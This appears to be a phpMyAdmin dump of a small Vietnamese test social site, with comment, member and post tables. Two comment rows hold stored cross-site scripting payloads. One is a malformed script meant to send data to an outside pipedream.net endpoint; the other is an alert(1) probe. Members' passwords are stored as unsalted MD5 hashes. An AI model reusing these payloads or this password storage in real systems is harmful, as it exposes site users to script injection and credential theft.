-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Máy chủ: 127.0.0.1
-- Thời gian đã tạo: Th7 19, 2022 lúc 04:15 PM
-- Phiên bản máy phục vụ: 10.4.22-MariaDB
-- Phiên bản PHP: 8.1.2

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `test`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `comment`
--

CREATE TABLE `comment` (
  `idcmt` int(100) NOT NULL,
  `idpost` int(100) NOT NULL,
  `id` int(100) NOT NULL,
  `text` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `comment`
--

INSERT INTO `comment` (`idcmt`, `idpost`, `id`, `text`, `date`) VALUES
(62, 58, 2, 'mua ngay ', '2022-03-23 05:16:56'),
(63, 55, 2, ' mua luôn ', '2022-03-23 05:17:04'),
(65, 58, 9, 'xúc', '2022-03-23 05:17:34'),
(67, 57, 2, 'alo ', '2022-04-08 08:47:18'),
(68, 58, 13, 'hehehehehehe', '2022-04-08 08:47:45'),
(73, 53, 2, 'alo ', '2022-04-22 10:58:42'),
(74, 53, 2, 'alo ', '2022-05-10 09:08:49'),
(75, 53, 2, 'alo ', '2022-05-10 09:10:01'),
(76, 53, 2, 'hehehehehehe', '2022-05-10 09:10:29'),
(77, 53, 2, 'hehehehehehe', '2022-05-10 09:10:46'),
(79, 66, 25, 'alo duc day ', '2022-05-19 17:22:03'),
(81, 66, 2, 'alo1234', '2022-06-13 05:40:32'),
(82, 66, 2, 'hehehehehehe', '2022-06-13 05:41:59'),
(83, 66, 2, 'hehehehehehe', '2022-06-13 05:42:03'),
(84, 58, 2, 'hello mấy cứng', '2022-06-13 05:42:44'),
(97, 66, 2, '<script>document.cookie.setAttribute(\"onmouseover\",\"fetch(\"https://eon5noyuk6u1z7t.m.pipedream.net\",{method:\"POST\",body:this.value}\")\")</script>', '2022-06-17 04:43:52'),
(98, 66, 2, '<span onmouseover=\"alert(1)\"> AHAHAHAHA</span>', '2022-06-17 04:44:43');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `member`
--

CREATE TABLE `member` (
  `id` int(100) NOT NULL,
  `username` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `pass` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `birthday` varchar(10) NOT NULL,
  `sex` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `trangthai` tinyint(4) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `member`
--

INSERT INTO `member` (`id`, `username`, `pass`, `email`, `birthday`, `sex`, `trangthai`) VALUES
(2, 'admin', '21232f297a57a5a743894a0e4a801fc3', 'admin', '01/01/2001', 'Nam', 1),
(9, 'vee', '9bf9e7052992467f671d923e9444624e', 'vee@abc.com', '03/03/2004', 'Nữ', 0),
(12, 'emgai', '524400b6391d77cd128b1eac176ede65', 'emgai@abc.com', '04/08/2005', 'Nữ', 0),
(13, 'bo', 'ad7532d5b3860a408fbe01f9455dca36', 'bo@abc.com', '03/05/1974', 'Nam', 0),
(14, 'me', 'ab86a1e1ef70dff97959067b723c5c24', 'me@gmail.com', '24/04/1974', 'Nữ', 0),
(15, 'anhtrai', '139773b088acf9c7bfdd66c539620240', 'anhtrai@abc.com', '23/01/2001', 'Nam', 0),
(16, 'xhung', '8c78a6803cdf6307aec22118f5089855', 'xhung@gmail.com', '23/01/2001', 'Nam', 0),
(18, 'xuanhung', 'd4b9dd72b9978e4f2f3941917af8d3f7', 'xhung@gmail.com', '23/01/2001', 'Nam', 0),
(19, 'concavang', 'e10adc3949ba59abbe56e057f20f883e', 'cavang@gmail.com', '23/02/2001', 'Nam', 0),
(20, 'conbovang', 'e10adc3949ba59abbe56e057f20f883e', 'bovang@gmail.com', '', '', 0),
(21, 'conmeovang', 'e10adc3949ba59abbe56e057f20f883e', 'meovang@gmail.com', '11/01/2002', 'Nữ', 0),
(25, 'duc ', 'e10adc3949ba59abbe56e057f20f883e', 'ducngu@gamil.com', '11/01/0101', 'Nam', 0);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `post`
--

CREATE TABLE `post` (
  `idpost` int(100) NOT NULL,
  `id` int(100) NOT NULL,
  `title` varchar(150) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `img` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `noidung` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `post`
--

INSERT INTO `post` (`idpost`, `id`, `title`, `img`, `noidung`, `date`) VALUES
(53, 2, '', '', 'ĐÂY LÀ ADMIN . Mọi thông tin liên hệ hãy gửi qua abc@gmail.com. <3 ', '2022-03-23 05:12:40'),
(54, 9, '', '', 'Đợt giảm giá do chính Apple triển khai hợp tác cùng các hệ thống bán lẻ sẽ diễn ra trong tháng 4 tới. Các sản phẩm giảm giá mạnh từ 20 tới 40% so với giá hiện tại, có mẫu còn giảm tới 5 - 6 triệu đồng.', '2022-03-23 05:13:00'),
(55, 16, '', '', 'realme GT Neo3 ra mắt: Smartphone sạc 150W nhanh nhất thế giới, chỉ 15 phút cắm sạc là đầy pin', '2022-03-23 05:13:21'),
(56, 13, '', '', 'Richard Branson và Jeff Bezos đều đã thực hiện thành công chuyến bay vào không gian. Một vài người giàu có trước đây cũng đã bay vào không gian nhưng Branson và Bezos không chỉ trả tiền mua vé - họ chi tiền đầu tư cho cả con tàu vũ trụ. Trong tương lai, những ai đủ giàu có nếu muốn rời khỏi Trái Đất họ sẽ không phải phụ thuộc vào các tàu không gian của Chính phủ.', '2022-03-23 05:13:58'),
(57, 14, '', '', 'Monster Energy tự hào không chỉ giúp cộng đồng game thủ nạp năng lượng tỉnh táo tức thì, giảm căng thẳng và duy trì sự tập trung cao độ trong các trận đấu nhờ thành phần chứa nhiều vitamin B3, B6, B12, Taurine, Nhân sâm và L-Carnitine cùng hàm lượng caffeine cao, mà còn mang đến chương trình \"Trúng ngay giải thưởng độc quyền từ HALO Infinite và Monster Energy\" vô cùng hấp dẫn với hàng ngàn quà tặng độc quyền có giá trị.', '2022-03-23 05:14:19'),
(58, 12, '', '', 'Trên tay nhanh Xiaomi 12 series: Bản tiêu chuẩn có màn hình nhỏ như iPhone 13, chip Snapdragon 8 Gen 1, sạc siêu nhanh 120W, giá từ 19.9 triệu đồng', '2022-03-23 05:14:37'),
(66, 2, '', '', 'Bài viết thứ 2 hehe', '2022-05-19 12:48:36');

--
-- Chỉ mục cho các bảng đã đổ
--

--
-- Chỉ mục cho bảng `comment`
--
ALTER TABLE `comment`
  ADD PRIMARY KEY (`idcmt`),
  ADD KEY `FK_idpost` (`idpost`),
  ADD KEY `FK_id` (`id`);

--
-- Chỉ mục cho bảng `member`
--
ALTER TABLE `member`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Chỉ mục cho bảng `post`
--
ALTER TABLE `post`
  ADD PRIMARY KEY (`idpost`),
  ADD KEY `FK_idmeber` (`id`);

--
-- AUTO_INCREMENT cho các bảng đã đổ
--

--
-- AUTO_INCREMENT cho bảng `comment`
--
ALTER TABLE `comment`
  MODIFY `idcmt` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=99;

--
-- AUTO_INCREMENT cho bảng `member`
--
ALTER TABLE `member`
  MODIFY `id` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;

--
-- AUTO_INCREMENT cho bảng `post`
--
ALTER TABLE `post`
  MODIFY `idpost` int(100) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=68;

--
-- Các ràng buộc cho các bảng đã đổ
--

--
-- Các ràng buộc cho bảng `comment`
--
ALTER TABLE `comment`
  ADD CONSTRAINT `FK_id` FOREIGN KEY (`id`) REFERENCES `member` (`id`),
  ADD CONSTRAINT `FK_idpost` FOREIGN KEY (`idpost`) REFERENCES `post` (`idpost`);

--
-- Các ràng buộc cho bảng `post`
--
ALTER TABLE `post`
  ADD CONSTRAINT `FK_idmeber` FOREIGN KEY (`id`) REFERENCES `member` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
